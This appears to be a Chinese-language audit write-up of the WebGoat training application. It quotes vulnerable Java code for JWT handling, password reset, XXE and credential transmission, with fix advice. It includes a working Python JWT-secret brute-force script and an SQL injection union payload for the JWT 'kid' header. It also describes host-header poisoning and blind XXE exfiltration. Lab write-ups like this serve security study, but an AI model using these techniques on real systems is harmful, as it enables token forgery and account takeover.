&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] SECRETS = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;victory&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;business&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;available&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;shipping&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;washington&amp;quot;&lt;/span&gt;&amp;#125;;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Random().nextInt(SECRETS.length)]);&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; String &lt;span class=&#34;title&#34;&gt;getSecretToken&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; Jwts.builder()                .setIssuer(&lt;span class=&#34;string&#34;&gt;&amp;quot;WebGoat Token Builder&amp;quot;&lt;/span&gt;)                .setAudience(&lt;span class=&#34;string&#34;&gt;&amp;quot;webgoat.org&amp;quot;&lt;/span&gt;)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;)))                .setSubject(&lt;span class=&#34;string&#34;&gt;&amp;quot;tom@webgoat.org&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Tom&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;Email&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;tom@webgoat.org&amp;quot;&lt;/span&gt;)                .claim(&lt;span class=&#34;string&#34;&gt;&amp;quot;Role&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;Manager&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Project Administrator&amp;quot;&lt;/span&gt;&amp;#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆破脚本（字典 pass.txt 用的是源码里面的数组）（如果脚本报错 jwt 找不到 jwt.exceptions，可能是 pyjwt 的问题，更新 pyjwt&amp;gt;=1.6.4 即可，&lt;a href=&#34;https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode&#34;&gt;解决来源&lt;/a&gt;）：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; termcolorimport jwtif __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:    jwt_str = &lt;span class=&#34;string&#34;&gt;&amp;#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&amp;#x27;&lt;/span&gt;    &lt;span class=&#34;function&#34;&gt;with &lt;span class=&#34;title&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pass.txt&amp;#x27;&lt;/span&gt;)&lt;/span&gt; as f:        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; line in f:            key_ &lt;/span&gt;= line.strip()            &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=&lt;span class=&#34;string&#34;&gt;&amp;quot;HS256&amp;quot;&lt;/span&gt;)                print(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bbingo! found key --&amp;gt;&amp;#x27;&lt;/span&gt;, termcolor.colored(key_, &lt;span class=&#34;string&#34;&gt;&amp;#x27;green&amp;#x27;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;--&amp;#x27;&lt;/span&gt;)                &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;            &lt;span class=&#34;title&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)&lt;/span&gt;:                &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bbingo! found key --&amp;gt;&amp;#x27;&lt;/span&gt;, termcolor.colored(key_, &lt;span class=&#34;string&#34;&gt;&amp;#x27;green&amp;#x27;&lt;/span&gt;)&lt;/span&gt;, &amp;#x27;&amp;lt;--&amp;#x27;)                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;            except jwt.exceptions.InvalidSignatureError:                &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\r\btry&amp;#x27;&lt;/span&gt;, key_, end=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, flush=True)&lt;/span&gt;                &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:            &lt;span class=&#34;title&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\r&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;\bsorry! no key be found.&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;爆破出来 key，就可以去 https://jwt.io/#debugger 加工啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt13.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTRefreshEndpoint&lt;/p&gt;
&lt;p&gt;登录时调用 createNewTokens ()&lt;/p&gt;
&lt;p&gt;会获取到的 refresh token 和该用户的 access token&lt;/p&gt;
&lt;p&gt;refresh token 是通过 RandomStringUtils.randomAlphabetic (20) 获取的随机值，用于刷新过期的 access token&lt;/p&gt;
&lt;p&gt;但是由于没有绑定用户信息，所以可以用来刷新任何任何用户的过期 token&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Map&amp;lt;String, Object&amp;gt; tokenJson = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap&amp;lt;&amp;gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;);        validRefreshTokens.add(refreshToken);        tokenJson.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;access_token&amp;quot;&lt;/span&gt;, token);        tokenJson.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;refresh_token&amp;quot;&lt;/span&gt;, refreshToken);        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; tokenJson;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;token 刷新，请求包中的 refresh_token 被包含在随机生成的 token 集合中时，就返回一个新的 token：&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (user == &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; || refreshToken == &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;) &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (validRefreshTokens.contains(refreshToken)) &amp;#123;            validRefreshTokens.remove(refreshToken);            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ok(createNewTokens(user));        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;利用登录接口，登录当前用户 jerry，获取刷新 refresh_token&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt14.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;没有成功刷新 token，报错信息：给出的 token 无法正常解析&lt;/p&gt;
&lt;p&gt;jwt–&amp;gt;JWTFinalEndpoint.resetVotes()&lt;/p&gt;
&lt;p&gt;存在 sql 注入点 &amp;quot;kid&amp;quot;(KID 代表 “密钥序号”（Key ID）。它是 JWT 头部的一个可选字段，开发人员可以用它标识认证 token 的某一密钥)&lt;/p&gt;
&lt;p&gt;可以通过 union 进行绕过，将 &amp;quot;key&amp;quot; 作为认证密钥，使用&lt;a href=&#34;https://jwt.io/#debugger&#34;&gt;在线工具&lt;/a&gt;伪造 token&lt;/p&gt;
&lt;p&gt;这里将数据库取出的 key 用 base64 解码了，所以在注入的时候要注入 key 的 base 编码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;aaa&lt;span class=&#34;string&#34;&gt;&amp;#x27; union select &amp;#x27;&lt;/span&gt;a2V5&lt;span class=&#34;string&#34;&gt;&amp;#x27; from jwt_keys where id=&amp;#x27;&lt;/span&gt;webgoat_key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String kid = (String) header.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;kid&amp;quot;&lt;/span&gt;);                        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; connection = dataSource.getConnection()) &amp;#123;                            ResultSet rs = connection.createStatement().executeQuery(&lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT key FROM jwt_keys WHERE id = &amp;#x27;&amp;quot;&lt;/span&gt; + kid + &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;#x27;&amp;quot;&lt;/span&gt;);                            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (rs.next()) &amp;#123;                                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; TextCodec.BASE64.decode(rs.getString(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));                            &amp;#125;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;建议&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保证密钥的保密性&lt;/li&gt;
&lt;li&gt;签名算法固定在后端，不以 JWT 里的算法为标准&lt;/li&gt;
&lt;li&gt;避免敏感信息保存在 JWT 中&lt;/li&gt;
&lt;li&gt;尽量 JWT 的有效时间足够短&lt;/li&gt;
&lt;li&gt;尽量避免用用户可以获取的参数刷新 token，避免逻辑绕过&lt;/li&gt;
&lt;li&gt;注意 header 部分，若有 sql 语句，建议使用预编译&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;a2v5 是 key 的 base64 编码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt15.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安全问题&lt;/p&gt;
&lt;p&gt;password_reset–&amp;gt;QuestionsAssignment&lt;/p&gt;
&lt;p&gt;密保问题设置为，你最喜欢的颜色是什么，可以直接用常见颜色生成字典进行爆破，建议使用更复杂的难以破解的问题，并且限制输入次数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;ba01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;password_reset–&amp;gt;ResetLinkAssignmentForgotPassword&lt;/p&gt;
&lt;p&gt;参数 host 是从 Request 头部获取的，可以通过控制 host 参数，给用户发送一个我们控制的 link，用户点击后访问我们的服务器，服务器记录该请求，从而获取到后面的 resetLink，然后我们再通过正常的访问修改密码&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;修复建议：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 禁止将用户可控的参数拼接进密码重置link2. 重置链接应该是一次性有效的
&lt;/code&gt;&lt;/pre&gt;
   &lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;fakeClickingLinkEmail&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String host, String resetLink)&lt;/span&gt; &lt;/span&gt;&amp;#123;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;            HttpHeaders httpHeaders = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HttpHeaders();            HttpEntity httpEntity = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HttpEntity(httpHeaders);            &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; RestTemplate().exchange(String.format(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://%s/PasswordReset/reset/reset-password/%s&amp;quot;&lt;/span&gt;, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception e) &amp;#123;         &lt;span class=&#34;comment&#34;&gt;//don&amp;#x27;t care        &amp;#125;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;攻击者服务器记录了请求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;pt18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;用户敏感信息传输与存储&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#用户敏感信息传输与存储&#34;&gt;#&lt;/a&gt; 用户敏感信息传输与存储&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-5&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;系统未对用户的敏感信息（如密码、身份证号、电话号码、银行卡号等）进行加密、脱敏等操作，导致用户信息存在泄露的风险。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-5&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;提交登录请求时，没有对密码进行加密&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-5&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;p&gt;前端存储的用户名和密码&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;submit_secret_credentials&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xhttp = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; XMLHttpRequest();    xhttp[&lt;span class=&#34;string&#34;&gt;&amp;#x27;open&amp;#x27;&lt;/span&gt;](&lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;#attack/307/100&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);	&lt;span class=&#34;comment&#34;&gt;//sending the request is obfuscated, to descourage js reading	var _0xb7f9=[&amp;quot;\x43\x61\x70\x74\x61\x69\x6E\x4A\x61\x63\x6B&amp;quot;,&amp;quot;\x42\x6C\x61\x63\x6B\x50\x65\x61\x72\x6C&amp;quot;,&amp;quot;\x73\x74\x72\x69\x6E\x67\x69\x66\x79&amp;quot;,&amp;quot;\x73\x65\x6E\x64&amp;quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&amp;#123;username:_0xb7f9[0],password:_0xb7f9[1]&amp;#125;))&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;调用该函数的发包截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;se01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;建议在数据传过程中，对用户的敏感数据进行加密&lt;/p&gt;
&lt;h1 id=&#34;xml外部实体注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml外部实体注入&#34;&gt;#&lt;/a&gt; XML 外部实体注入&lt;/h1&gt;
&lt;h2 id=&#34;漏洞描述-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述-6&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h2&gt;
&lt;p&gt;XXE（XML External Entity Injection）是一种针对 XML 终端实施的攻击，漏洞产生的根本原因就是在 XML1.0 标准中引入了 “entity” 这个概念，且 “entity” 可以在预定义的文档中进行调用，XXE 漏洞的利用就是通过实体的标识符访问本地或者远程内容。黑客想要实施这种攻击，需要在 XML 的 payload 包含外部实体声明，且服务器本身允许实体扩展。这样的话，黑客或许能读取 WEB 服务器的文件系统，通过 UNC 路径访问远程文件系统，或者通过 HTTP/HTTPS 连接到任意主机。&lt;/p&gt;
&lt;h2 id=&#34;漏洞成因-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞成因-6&#34;&gt;#&lt;/a&gt; 漏洞成因&lt;/h2&gt;
&lt;p&gt;XML 解析没有禁止外部实体的解析，且用户可控 REST XML 格式的参数。&lt;/p&gt;
&lt;h2 id=&#34;代码片段以及修复建议-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#代码片段以及修复建议-6&#34;&gt;#&lt;/a&gt; 代码片段以及修复建议&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;SimpleXXE.createNewComment()&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; secure = &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;;     	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; != request.getSession().getAttribute(&lt;span class=&#34;string&#34;&gt;&amp;quot;applySecurity&amp;quot;&lt;/span&gt;)) &amp;#123;     		secure = &lt;span class=&#34;keyword&#34;&gt;true&lt;/span&gt;;     	&amp;#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;);         &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (checkSolution(comment)) &amp;#123;             &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; success(&lt;span class=&#34;keyword&#34;&gt;this&lt;/span&gt;).build();         &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中调用 Comment 的 parseXml (commentStr, secure) 方法进行 xml 解析&lt;br&gt;
正如代码中所示，可以通过设置 XMLConstants 的两个属性来禁用外部实体解析，默认的空字符串就是禁用，也可以指定协议等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;详细信息可以看 XMLConstants 中的注释。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; jc = JAXBContext.newInstance(Comment.class);     &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; xif = XMLInputFactory.newInstance();   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (secure) &amp;#123;        	xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;// Compliant     	xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &amp;quot;&amp;quot;);  // compliant        &amp;#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe01.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;ContentTypeAssignment.createNewUser()&lt;/p&gt;
&lt;p&gt;根据 contentType 判断数据格式，xml 解析和 1 一样，其余同上&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 如果是xml格式        if (null != contentType &amp;amp;&amp;amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &amp;#123;            String error = &amp;quot;&amp;quot;;            try &amp;#123;            	boolean secure = false;            	if (null != request.getSession().getAttribute(&amp;quot;applySecurity&amp;quot;)) &amp;#123;            		secure = true;            	&amp;#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &amp;#123;                    attackResult = success(this).build();                &amp;#125;            &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;xxe03.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;xxe–&amp;gt;ContentTypeAssignment.addComment()&lt;/p&gt;
&lt;p&gt;这里作者为了弄一个 blind xxe，特别设置了提交正确的内容才返回 success&lt;/p&gt;
&lt;p&gt;xml 解析代码并没有改变&lt;/p&gt;
&lt;p&gt;实际上还是通过参数实体注入（参数实体也能被外部引用），为了看到数据所以要通过盲打的方式，将 WEB 服务器的本地文件内容发送到攻击者的服务器&lt;/p&gt;
&lt;p&gt;修复建议同上&lt;/p&gt;
